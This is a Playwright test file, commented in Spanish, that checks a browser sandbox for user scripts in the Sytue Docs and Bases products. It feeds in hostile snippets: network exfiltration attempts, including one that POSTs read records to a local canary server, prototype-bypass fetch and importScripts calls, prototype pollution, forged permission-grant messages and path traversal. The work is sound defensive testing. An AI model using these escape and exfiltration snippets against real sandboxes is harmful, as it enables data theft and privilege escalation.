/*
 * SPDX-License-Identifier: Apache-2.0
 * Copyright (c) 2026 Daniel Delgado Ramos
 *
 * PRUEBAS ADVERSARIALES DEL SANDBOX DE SCRIPTS DE USUARIO (ADR 0069), en un Chromium real.
 *
 * Un script hostil intenta salir: red (fetch, XHR, WebSocket, importScripts, import(),
 * el fetch del prototipo), cookies y storage del anfitrión, window.parent/top, bucles
 * infinitos, memoria, spam de postMessage, mensajes enormes o con prototipo manipulado,
 * comandos fuera del manifiesto y escribir sin permiso. Cada caso afirma el resultado
 * que se AUDITARÍA (`outcome` y `errorCode`) y que el «canario» —un servidor que anota
 * cualquier petición que llegue— no recibió NADA.
 *
 * Autocontenido: levanta su propio servidor local y compila el módulo con `bun build`.
 * Uso (EN EL CONTENEDOR sytue-agentes, nunca en el portátil):
 *   cd test/e2e && bun install --frozen-lockfile && bun run scripts-sandbox.mjs
 *
 * PRODUCTO=bases corre los casos de Sytue Bases (misma jaula, su superficie `sytue.v1`):
 *   PRODUCTO=bases bun run scripts-sandbox.mjs
 *
 * SABOTAJE=csp|same-origin|tiempo  desactiva A MANO una defensa para ver
 * fallar la prueba que la vigila (un guardián que no se ha visto en rojo no protege nada).
 */
import { chromium } from "playwright";
import { execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const RAIZ = fileURLToPath(new URL("../../", import.meta.url));
const SABOTAJE = process.env.SABOTAJE ?? "";
// PRODUCTO=docs (por defecto) | bases: la superficie `sytue.v1` contra la que se prueba.
// El sandbox es el MISMO (`@sytue/scripts`); lo que cambia es la API y su anfitrión.
const PRODUCTO = process.env.PRODUCTO ?? "docs";

const salida = join(mkdtempSync(join(tmpdir(), "sandbox-")), "scripts.js");
execFileSync(
  "bun",
  [
    "build",
    fileURLToPath(new URL("./scripts-sandbox-entrada.ts", import.meta.url)),
    "--target=browser",
    "--outfile",
    salida,
  ],
  { stdio: "inherit" },
);
const bundle = readFileSync(salida, "utf8");

/* ---------- Servidor: anfitrión con «sesión» y canario ---------- */
const canario = [];
const informes = [];
const servidor = createServer((req, res) => {
  const url = req.url ?? "/";
  if (url.startsWith("/canario")) {
    canario.push(`${req.method} ${url} cookie=${req.headers.cookie ?? ""}`);
    res.writeHead(200, { "access-control-allow-origin": "*" }).end("ok");
  } else if (url === "/bundle.js") {
    res.writeHead(200, { "content-type": "text/javascript" }).end(bundle);
  } else if (url.startsWith("/informe")) {
    let cuerpo = "";
    req
      .on("data", (c) => (cuerpo += c))
      .on("end", () => {
        informes.push(JSON.parse(cuerpo));
        res.writeHead(204).end();
      });
  } else {
    res
      .writeHead(200, {
        "content-type": "text/html",
        "set-cookie": "sesion=SECRETO; Path=/",
      })
      .end(
        '<!doctype html><title>host</title><script src="/bundle.js"></script>',
      );
  }
});
await new Promise((ok) => servidor.listen(0, "127.0.0.1", ok));
const PUERTO = servidor.address().port;
const BASE = `http://127.0.0.1:${PUERTO}`;

/* ---------- Casos ---------- */
const M = (extra = {}) => ({
  v: 1,
  commands: ["bold"],
  read: ["title"],
  write: true,
  max_ms: 1500,
  max_ops: 50,
  ...extra,
});
const LOG = "const L=(...a)=>sytue.v1.log(...a);";

/** [nombre, código, manifiesto, esperado {outcome, errorCode?, salida?}, extra] */
const CASOS = [
  [
    "camino feliz",
    `await sytue.v1.run('bold'); sytue.v1.log(await sytue.v1.read.title());`,
    M(),
    { outcome: "ok", salida: ["Título"] },
  ],
  [
    "fetch relativo",
    `await fetch('/canario/fetch')`,
    M(),
    { outcome: "error", errorCode: "script_error" },
  ],
  [
    "fetch absoluto",
    `await fetch('${BASE}/canario/abs', {mode:'no-cors'})`,
    M(),
    { outcome: "error" },
  ],
  [
    "fetch del prototipo (salta el preludio, lo para la CSP)",
    `const f=Object.getPrototypeOf(self).fetch; await f.call(self,'${BASE}/canario/proto',{mode:'no-cors'})`,
    M(),
    { outcome: "error" },
  ],
  [
    "XMLHttpRequest",
    `const x=new XMLHttpRequest(); x.open('GET','${BASE}/canario/xhr'); x.send();`,
    M(),
    { outcome: "error" },
  ],
  [
    "WebSocket",
    `new WebSocket('ws://127.0.0.1:${PUERTO}/canario/ws')`,
    M(),
    { outcome: "error" },
  ],
  [
    "importScripts",
    `importScripts('${BASE}/canario/imp.js')`,
    M(),
    { outcome: "error" },
  ],
  [
    "importScripts del prototipo",
    `Object.getPrototypeOf(Object.getPrototypeOf(self)).importScripts.call(self,'${BASE}/canario/imp2.js')`,
    M(),
    { outcome: "error" },
  ],
  [
    "import() dinámico",
    `await import('${BASE}/canario/mod.js')`,
    M(),
    { outcome: "error" },
  ],
  [
    "sendBeacon",
    `navigator.sendBeacon('${BASE}/canario/beacon','x')`,
    M(),
    { outcome: "error" },
  ],
  [
    "eval y Function bloqueados",
    `try{eval('1')}catch(e){L('eval:'+e.name)}; try{new Function('return 1')}catch(e){L('fn:'+e.name)}`,
    M(),
    { outcome: "ok", salida: ["eval:EvalError", "fn:EvalError"], prefijo: LOG },
  ],
  [
    "sin window, parent, top ni document",
    `L(typeof window, typeof parent, typeof top, typeof document, typeof frames)`,
    M(),
    {
      outcome: "ok",
      salida: ["undefined undefined undefined undefined undefined"],
      prefijo: LOG,
    },
  ],
  [
    "sin cookies ni storage",
    `L(typeof document, typeof localStorage, typeof sessionStorage, typeof indexedDB, typeof caches)`,
    M(),
    {
      outcome: "ok",
      salida: ["undefined undefined undefined undefined undefined"],
      prefijo: LOG,
    },
  ],
  [
    "origen opaco",
    `L(self.origin)`,
    M(),
    { outcome: "ok", salida: ["null"], prefijo: LOG },
  ],
  [
    "la API no se puede reescribir",
    `try{sytue.v1.run=()=>1;L('mal')}catch(e){L('congelada')}; try{sytue.v1=1;L('mal')}catch(e){L('fija')}`,
    M(),
    { outcome: "ok", salida: ["congelada", "fija"], prefijo: LOG },
  ],
  [
    "bucle infinito",
    `while(true){}`,
    M({ max_ms: 400 }),
    { outcome: "timeout", errorCode: "timeout" },
    { vivo: true },
  ],
  [
    "memoria sin tope (la acota el tiempo)",
    `const a=[]; while(true){ a.push(new Uint8Array(1<<20).fill(1)); }`,
    M({ max_ms: 300 }),
    { outcome: "timeout", errorCode: "timeout" },
    { vivo: true },
  ],
  [
    "spam de postMessage",
    `for(;;) self.postMessage({t:'log',text:'x'})`,
    M({ max_ms: 3000 }),
    { outcome: "limit" },
    { vivo: true },
  ],
  [
    "spam de llamadas",
    `for(let i=0;i<5000;i++) sytue.v1.read.title();`,
    M({ max_ms: 3000, max_ops: 10_000 }),
    { outcome: "limit" },
  ],
  [
    "demasiadas operaciones",
    `for(let i=0;i<100;i++) await sytue.v1.read.title();`,
    M({ max_ops: 20 }),
    { outcome: "limit", errorCode: "max_ops" },
  ],
  [
    "mensaje enorme",
    `self.postMessage({t:'call',seq:1,op:'run',args:['x'.repeat(16384),'x'.repeat(16384),'x'.repeat(16384),'x'.repeat(16384)]})`,
    M(),
    { outcome: "limit" },
  ],
  [
    "salida enorme",
    `for(let i=0;i<40;i++){ sytue.v1.log('y'.repeat(4000)); await sytue.v1.read.title(); }`,
    M({ max_ops: 200 }),
    { outcome: "limit", errorCode: "salida" },
  ],
  [
    "prototype pollution del mensaje",
    `self.postMessage(JSON.parse('{"t":"done","__proto__":{"polluted":1}}'))`,
    M(),
    { outcome: "denied", errorCode: "mensaje_invalido" },
    { contaminacion: true },
  ],
  [
    "mensaje forjado: eval",
    `self.postMessage({t:'eval',code:'alert(1)'})`,
    M(),
    { outcome: "denied", errorCode: "mensaje_invalido" },
  ],
  [
    "mensaje forjado: operación inexistente",
    `self.postMessage({t:'call',seq:1,op:'fetch',args:['${BASE}/canario/op']})`,
    M(),
    { outcome: "denied", errorCode: "mensaje_invalido" },
  ],
  [
    "comando fuera del manifiesto",
    `await sytue.v1.run('italic')`,
    M(),
    { outcome: "denied", errorCode: "comando_no_permitido" },
  ],
  [
    "comando de protección por un mensaje forjado",
    `self.postMessage({t:'call',seq:1,op:'run',args:['protect','clave']})`,
    M({ commands: ["bold"] }),
    { outcome: "denied", errorCode: "comando_no_permitido" },
  ],
  [
    "relleno con IA declarado en el manifiesto",
    `await sytue.v1.run('aifill','suma la columna')`,
    M({ commands: ["bold", "aifill"] }),
    { outcome: "denied", errorCode: "manifiesto_invalido" },
  ],
  [
    "compartir por un mensaje forjado",
    `self.postMessage({t:'call',seq:1,op:'run',args:['share']})`,
    M(),
    { outcome: "denied", errorCode: "comando_no_permitido" },
  ],
  [
    "escribir sin declarar escritura",
    `await sytue.v1.run('bold')`,
    M({ write: false }),
    { outcome: "denied", errorCode: "escritura_no_declarada" },
  ],
  [
    "escribir sin permiso (solo lectura)",
    `await sytue.v1.run('bold')`,
    M(),
    { outcome: "denied", errorCode: "solo_lectura" },
    { soloLectura: true },
  ],
  [
    "hoja protegida: el editor veta y la ejecución queda como error",
    `await sytue.v1.run('bold')`,
    M(),
    { outcome: "error", errorCode: "fallo_anfitrion" },
    { protegida: true },
  ],
  [
    "leer lo no declarado",
    `await sytue.v1.read.text()`,
    M(),
    { outcome: "denied", errorCode: "lectura_no_declarada" },
  ],
  [
    "leer fuera del ámbito",
    `await sytue.v1.read.cell('Secreta','A1')`,
    M({ read: ["cells"], scope: { sheets: ["Datos"] } }),
    { outcome: "denied", errorCode: "ambito" },
  ],
  [
    "sin interacción sin declararlo",
    `1`,
    M(),
    { outcome: "denied", errorCode: "no_interactivo" },
    { interactivo: false },
  ],
];

/* ---------- Casos de Sytue Bases (PRODUCTO=bases) ---------- */
const T1 = "11111111-1111-4111-8111-111111111111";
const AJENA = "99999999-9999-4999-8999-999999999999";
const R1 = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
const R_AJENO = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
const CAMPO = "cccccccc-cccc-4ccc-8ccc-cccccccccccc";
const MB = (extra = {}) => ({
  v: 1,
  ops: ["tables.list", "records.list", "records.get", "records.create"],
  tables: [],
  write: true,
  max_ms: 1500,
  max_ops: 50,
  ...extra,
});

/** Igual que CASOS, y `esperado.llamadas`: lo que el anfitrión llegó a pedir a la API. */
const CASOS_BASES = [
  [
    "camino feliz",
    `const t=await sytue.v1.tables.list(); sytue.v1.log(t.length, t[0].name);
     const r=await sytue.v1.records.create(t[0].id,{"${CAMPO}":"x"}); sytue.v1.log(r.table_id===t[0].id);`,
    MB(),
    {
      outcome: "ok",
      salida: ["1 Clientes", "true"],
      llamadas: ["listTables", "createRecord"],
    },
  ],
  [
    "fetch absoluto",
    `await fetch('${BASE}/canario/abs', {mode:'no-cors'})`,
    MB(),
    { outcome: "error", llamadas: [] },
  ],
  [
    "fetch del prototipo (salta el preludio, lo para la CSP)",
    `const f=Object.getPrototypeOf(self).fetch; await f.call(self,'${BASE}/canario/proto',{mode:'no-cors'})`,
    MB(),
    { outcome: "error" },
  ],
  [
    "llevarse lo leído por la red",
    `const p=await sytue.v1.records.list('${T1}'); const x=new XMLHttpRequest(); x.open('POST','${BASE}/canario/datos'); x.send(JSON.stringify(p));`,
    MB(),
    { outcome: "error", llamadas: ["listTables", "listRecords"] },
  ],
  [
    "WebSocket",
    `new WebSocket('ws://127.0.0.1:${PUERTO}/canario/ws')`,
    MB(),
    { outcome: "error" },
  ],
  [
    "importScripts del prototipo",
    `Object.getPrototypeOf(Object.getPrototypeOf(self)).importScripts.call(self,'${BASE}/canario/imp2.js')`,
    MB(),
    { outcome: "error" },
  ],
  [
    "import() dinámico",
    `await import('${BASE}/canario/mod.js')`,
    MB(),
    { outcome: "error" },
  ],
  [
    "eval y Function bloqueados",
    `try{eval('1')}catch(e){L('eval:'+e.name)}; try{new Function('return 1')}catch(e){L('fn:'+e.name)}`,
    MB(),
    { outcome: "ok", salida: ["eval:EvalError", "fn:EvalError"], prefijo: LOG },
  ],
  [
    "sin la página, sin cookies ni storage, origen opaco",
    `L(typeof window, typeof parent, typeof document, typeof localStorage, typeof indexedDB, self.origin)`,
    MB(),
    {
      outcome: "ok",
      salida: ["undefined undefined undefined undefined undefined null"],
      prefijo: LOG,
    },
  ],
  [
    "la API no se puede reescribir ni ampliar",
    `try{sytue.v1.records.delete=()=>1;L('mal')}catch(e){L('congelada')}; try{sytue.v1.records={};L('mal')}catch(e){L('fija')}; L(typeof sytue.v1.records.delete, typeof sytue.v1.run, typeof sytue.v1.permissions)`,
    MB(),
    {
      outcome: "ok",
      salida: ["congelada", "fija", "function undefined undefined"],
      prefijo: LOG,
    },
  ],
  [
    "bucle infinito",
    `while(true){}`,
    MB({ max_ms: 400 }),
    { outcome: "timeout", errorCode: "timeout" },
    { vivo: true },
  ],
  [
    "spam de llamadas",
    `for(let i=0;i<5000;i++) sytue.v1.tables.list();`,
    MB({ max_ms: 3000, max_ops: 500 }),
    { outcome: "limit" },
  ],
  [
    "demasiadas operaciones",
    `for(let i=0;i<100;i++) await sytue.v1.tables.list();`,
    MB({ max_ops: 20 }),
    { outcome: "limit", errorCode: "max_ops" },
  ],
  [
    "mensaje forjado: conceder permisos",
    `self.postMessage({t:'call',seq:1,op:'permissions.grant',args:['${T1}','owner']})`,
    MB(),
    { outcome: "denied", errorCode: "mensaje_invalido", llamadas: [] },
  ],
  [
    "mensaje forjado: una operación de Docs",
    `self.postMessage({t:'call',seq:1,op:'run',args:['share']})`,
    MB(),
    { outcome: "denied", errorCode: "mensaje_invalido", llamadas: [] },
  ],
  [
    "borrar sin declararlo (y por un mensaje forjado)",
    `self.postMessage({t:'call',seq:1,op:'records.delete',args:['${R1}']})`,
    MB(),
    { outcome: "denied", errorCode: "operacion_no_declarada", llamadas: [] },
  ],
  [
    "escribir sin declarar escritura",
    `await sytue.v1.records.create('${T1}',{})`,
    MB({ write: false }),
    { outcome: "denied", errorCode: "manifiesto_invalido", llamadas: [] },
  ],
  [
    "leer una tabla de otra base",
    `L(JSON.stringify(await sytue.v1.records.list('${AJENA}')))`,
    MB(),
    {
      outcome: "denied",
      errorCode: "ambito",
      salida: [],
      llamadas: ["listTables"],
      prefijo: LOG,
    },
  ],
  [
    "leer un registro de otra base por su id",
    `try{ L(JSON.stringify(await sytue.v1.records.get('${R_AJENO}'))) }catch(e){ L(e.code, e.message.includes('SECRETO')) }`,
    MB(),
    {
      outcome: "denied",
      errorCode: "ambito",
      llamadas: ["getRecord", "listTables"],
      prefijo: LOG,
    },
  ],
  [
    "fuera de las tablas del manifiesto",
    `await sytue.v1.records.list('${T1}')`,
    MB({ tables: ["22222222-2222-4222-8222-222222222222"] }),
    { outcome: "denied", errorCode: "ambito", llamadas: [] },
  ],
  [
    "una ruta en lugar de un id",
    `await sytue.v1.records.list('${T1}/../../bases')`,
    MB(),
    { outcome: "denied", errorCode: "args", llamadas: [] },
  ],
  [
    "prototype pollution por un argumento",
    `await sytue.v1.records.create('${T1}', JSON.parse('{"__proto__":{"polluted":1}}'))`,
    MB(),
    { outcome: "denied", errorCode: "args", llamadas: ["listTables"] },
  ],
  [
    "lo que el servidor niega a la persona aborta el script",
    `await sytue.v1.records.create('${T1}',{}); L('sigue')`,
    MB(),
    {
      outcome: "denied",
      errorCode: "sin_permiso",
      salida: [],
      llamadas: ["listTables", "createRecord"],
      prefijo: LOG,
    },
    { prohibido: true },
  ],
];

/* ---------- Ejecución ---------- */
const navegador = await chromium.launch();
let fallos = 0;
const ok = (c, msg) => {
  if (!c) {
    fallos += 1;
    console.log("    FALLO:", JSON.stringify(String(msg)));
  }
};

const LISTA = PRODUCTO === "bases" ? CASOS_BASES : CASOS;
for (const [nombre, codigo, manifiesto, esperado, extra = {}] of LISTA) {
  const ctx = await navegador.newContext();
  const page = await ctx.newPage();
  if (SABOTAJE === "csp")
    await page.addInitScript(() => {
      const d = Object.getOwnPropertyDescriptor(
        HTMLIFrameElement.prototype,
        "srcdoc",
      );
      Object.defineProperty(HTMLIFrameElement.prototype, "srcdoc", {
        set(v) {
          d.set.call(
            this,
            v.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, ""),
          );
        },
      });
    });
  if (SABOTAJE === "same-origin")
    await page.addInitScript(() => {
      const o = HTMLIFrameElement.prototype.setAttribute;
      HTMLIFrameElement.prototype.setAttribute = function (k, v) {
        return o.call(
          this,
          k,
          k === "sandbox" ? "allow-scripts allow-same-origin" : v,
        );
      };
    });
  await page.goto(`${BASE}/`);
  await page.evaluate(() => localStorage.setItem("secreto", "SECRETO"));
  const antes = canario.length;
  const t0 = Date.now();
  const res = await page.evaluate(
    async ({ codigo, manifiesto, extra, prefijo, sabotaje, producto }) => {
      if (producto === "bases") {
        const { r, llamadas } = await window.SytueScripts.ejecutarBases({
          codigo: (prefijo ?? "") + codigo,
          manifiesto:
            sabotaje === "tiempo"
              ? { ...manifiesto, max_ms: 30000 }
              : manifiesto,
          extra,
        });
        return {
          r,
          iframes: document.querySelectorAll("iframe").length,
          contaminado: {}.polluted !== undefined,
          llamadas,
        };
      }
      const pasos = [];
      const r = await window.SytueScripts.ejecutarScript({
        codigo: (prefijo ?? "") + codigo,
        manifiesto:
          sabotaje === "tiempo" ? { ...manifiesto, max_ms: 30000 } : manifiesto,
        contexto: {
          entorno: {
            kind: "spreadsheet",
            soloLectura: !!extra.soloLectura,
            origenes: { propio: location.origin, drive: [] },
          },
        },
        anfitrion: {
          despachar: (p) => {
            if (extra.protegida) throw new Error("hoja protegida");
            pasos.push(p);
          },
          leer: (que) => (que === "title" ? "Título" : null),
        },
        crearSandbox: () => window.SytueScripts.crearSandbox(),
        ...(extra.interactivo === false ? { interactivo: false } : {}),
      });
      // El anfitrión sigue vivo y sin restos: ni iframe ni contaminación.
      return {
        r,
        iframes: document.querySelectorAll("iframe").length,
        contaminado: {}.polluted !== undefined,
        pasos: pasos.length,
      };
    },
    {
      codigo,
      manifiesto,
      extra,
      prefijo: esperado.prefijo ?? "",
      sabotaje: SABOTAJE,
      producto: PRODUCTO,
    },
  );
  const ms = Date.now() - t0;
  // Informe al «servidor de auditoría», como hará la interfaz.
  await page.evaluate(
    (b) => fetch("/informe", { method: "PUT", body: JSON.stringify(b) }),
    {
      nombre,
      outcome: res.r.outcome,
      error_code: res.r.errorCode,
      duration_ms: res.r.durationMs,
      ops: res.r.ops,
    },
  );
  console.log(
    `${nombre}: ${res.r.outcome}/${res.r.errorCode || "-"} (${ms} ms)`,
  );
  ok(
    res.r.outcome === esperado.outcome,
    `outcome ${res.r.outcome}, esperado ${esperado.outcome} (${res.r.message})`,
  );
  if (esperado.errorCode)
    ok(
      res.r.errorCode === esperado.errorCode,
      `errorCode ${res.r.errorCode}, esperado ${esperado.errorCode}`,
    );
  if (esperado.salida)
    ok(
      JSON.stringify(res.r.output) === JSON.stringify(esperado.salida),
      `salida ${JSON.stringify(res.r.output)}`,
    );
  if (esperado.llamadas)
    ok(
      JSON.stringify([...res.llamadas].sort()) ===
        JSON.stringify([...esperado.llamadas].sort()),
      `la API recibió ${JSON.stringify(res.llamadas)}, esperado ${JSON.stringify(esperado.llamadas)}`,
    );
  ok(
    canario.length === antes,
    `el canario recibió ${canario.slice(antes).join(" | ")}`,
  );
  ok(res.iframes === 0, "quedó un iframe vivo");
  ok(!res.contaminado, "Object.prototype contaminado en el anfitrión");
  if (extra.vivo)
    ok(
      ms < (manifiesto.max_ms ?? 1500) + 3000,
      `tardó ${ms} ms: no hubo terminación forzosa a tiempo`,
    );
  await ctx.close();
}

/* ---------- Impostor: otro marco que escribe al anfitrión no cuenta ---------- */
// Lo vigila el sandbox común: se prueba una vez, con el anfitrión de Docs.
if (PRODUCTO === "docs") {
  const ctx = await navegador.newContext();
  const page = await ctx.newPage();
  await page.goto(`${BASE}/`);
  const r = await page.evaluate(async () => {
    const sandbox = window.SytueScripts.crearSandbox();
    const impostor = document.createElement("iframe");
    impostor.setAttribute("sandbox", "allow-scripts");
    impostor.srcdoc =
      '<script>setInterval(()=>parent.postMessage({t:"done"},"*"),20)<\/script>';
    document.body.appendChild(impostor);
    return window.SytueScripts.ejecutarScript({
      codigo: "while(true){}",
      manifiesto: { v: 1, commands: [], read: [], write: false, max_ms: 600 },
      contexto: {
        entorno: {
          kind: "spreadsheet",
          soloLectura: false,
          origenes: { propio: location.origin, drive: [] },
        },
      },
      anfitrion: { despachar() {} },
      crearSandbox: () => sandbox,
    });
  });
  console.log(`marco impostor: ${r.outcome}/${r.errorCode || "-"}`);
  ok(
    r.outcome === "timeout",
    `un marco ajeno cerró la ejecución como ${r.outcome}`,
  );
  await ctx.close();
}

/* ---------- Auditoría: todo lo anterior quedó informado ---------- */
ok(
  informes.length === LISTA.length,
  `informes ${informes.length} de ${LISTA.length}`,
);
ok(
  informes.every(
    (i) => typeof i.outcome === "string" && /^[a-z0-9_.-]*$/.test(i.error_code),
  ),
  "un informe sin forma auditable",
);
ok(canario.length === 0, `el canario recibió en total: ${canario.join(" | ")}`);

await navegador.close();
servidor.close();
console.log(fallos === 0 ? "\nTODO CORRECTO" : `\n${fallos} FALLO(S)`);
process.exit(fallos === 0 ? 0 : 1);
